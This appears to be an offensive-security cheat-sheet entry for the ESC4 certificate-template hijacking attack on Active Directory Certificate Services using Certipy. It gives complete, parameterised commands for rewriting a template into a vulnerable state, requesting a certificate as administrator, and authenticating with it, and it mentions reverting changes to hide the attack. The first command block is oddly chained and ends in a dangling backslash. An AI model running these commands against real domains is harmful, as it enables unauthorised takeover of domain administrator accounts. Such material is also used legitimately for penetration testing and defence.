# Esc4

## esc4 certipy

### Template Hijacking (Certipy)

Walkthrough text for ESC4: rewrite a vulnerable template, request a cert as administrator, then PKINIT auth. Prints the steps as reference notes; not meant to be executed as-is.

```sh title:"Reference walkthrough for ESC4 template hijacking"
cat << EOF
Exploiting ESC4 involves an attacker with write permissions on a template first modifying it to a vulnerable configuration (e.g., to resemble an ESC1 scenario), then requesting a certificate using this maliciously altered template, and finally, potentially reverting the changes to cover their tracks. Assume the attacker is attacker@corp.local and has obtained write permissions on the "$template_name" template (perhaps through membership in Authenticated Users if that group has excessive rights as shown in the identification snippet).
Step 1: Modify the template to a vulnerable state. Certipy's template command with the -write-default-configuration option is a convenient way to automatically reconfigure a target template to a known ESC1-like vulnerable state.
certipy template \
    -u '$user@$domain' -p '$pass' \
    -dc-ip '$rhost_ip' -template '$template_name' \
    -write-default-configuration && certipy req \
    -u '$user@$domain' -p '$pass' \
    -dc-ip '$rhost_ip' -target '$target_ca' \
    -ca '$ca_name' -template '$template_name' \
    -upn 'administrator@$domain' -sid '$admin_sid'\
Step 2: Request a certificate using the modified template. The attacker now requests a certificate for a privileged user (e.g., Administrator), leveraging the ESC1 vulnerability they just created in the "$template_name" template.
certipy req \
    -u '$user@$domain' -p '$pass' \
    -dc-ip '$rhost_ip' -target '$target_ca' \
    -ca '$ca_name' -template '$template_name' \
    -upn 'administrator@$domain' -sid '$admin_sid'
Step 3: Authenticate using the obtained certificate.
certipy auth -pfx 'administrator.pfx' -dc-ip '$rhost_ip'
EOF
```
<!-- cheat
import domain_ip
import users
import passwords
var template_name
var target_ca
var ca_name
var admin_sid
-->

